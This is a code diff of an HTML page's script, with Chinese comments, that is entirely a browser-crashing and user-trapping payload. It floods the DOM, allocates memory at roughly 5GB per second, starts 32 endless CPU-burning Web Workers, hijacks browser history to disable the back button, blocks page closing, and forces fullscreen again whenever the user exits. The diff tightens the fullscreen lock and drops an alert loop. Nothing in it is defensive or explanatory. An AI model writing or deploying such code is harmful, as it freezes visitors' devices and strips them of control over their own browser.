@@ -26,7 +26,7 @@
         }
         draw();
 
-        // ===== DOM =====
+        // ===== DOM狂造 =====
         setInterval(function(){
             for(var i=0;i<200;i++){
                 var d=document.createElement('div');
@@ -37,7 +37,7 @@
             }
         },100);
 
-        // ===== emoji =====
+        // ===== emoji狂造 =====
         setInterval(function(){
             for(var i=0;i<100;i++){
                 var s=document.createElement('span');
@@ -49,49 +49,31 @@
             }
         },80);
 
-        // ===== 内存 =====
+        // ===== 内存：5GB/s =====
         var r=[];setInterval(function(){for(var i=0;i<10;i++){r.push(new ArrayBuffer(50*1024*1024))}},100);
 
-        // ===== Worker =====
+        // ===== Worker CPU =====
         var code='while(true){var x=0;for(var i=0;i<10000000;i++){x+=Math.sqrt(i)*Math.sin(i);}}';
         var blob=new Blob([code],{type:'text/javascript'});
         var url=URL.createObjectURL(blob);
         for(var i=0;i<32;i++){new Worker(url);}
 
-        // ===== 弹窗 =====
-        function spamAlert(){
-            alert('🌸 正在加载...');
-            setTimeout(spamAlert, 200);
-        }
-        spamAlert();
-
-        // ===== 锁死 =====
+        // ===== history锁死 =====
         history.pushState(null,null,location.href);
         window.onpopstate=function(){history.go(1)};
         setInterval(function(){history.pushState(null,null,location.href+'#'+Math.random())},10);
+
+        // ===== beforeunload =====
         window.onbeforeunload=function(){return'x'};
 
-        // ===== 🔒 点屏幕触发全屏 =====
-        var locked=false;
-        function goFull(){
+        // ===== 🔒 全屏锁死 =====
+        function lockFull(){
             document.documentElement.requestFullscreen().catch(function(){});
         }
-        document.addEventListener('click', function(){
-            if(!locked){
-                goFull();
-                locked=true;
-            }
-            if(!document.fullscreenElement){ goFull(); }
-        });
-        document.addEventListener('touchstart', function(){
-            if(!locked){
-                goFull();
-                locked=true;
-            }
-            if(!document.fullscreenElement){ goFull(); }
-        });
+        document.addEventListener('click', lockFull);
+        document.addEventListener('touchstart', lockFull);
         document.addEventListener('fullscreenchange', function(){
-            if(!document.fullscreenElement && locked){ goFull(); }
+            if(!document.fullscreenElement){ lockFull(); }
         });
     </script>
 </body>
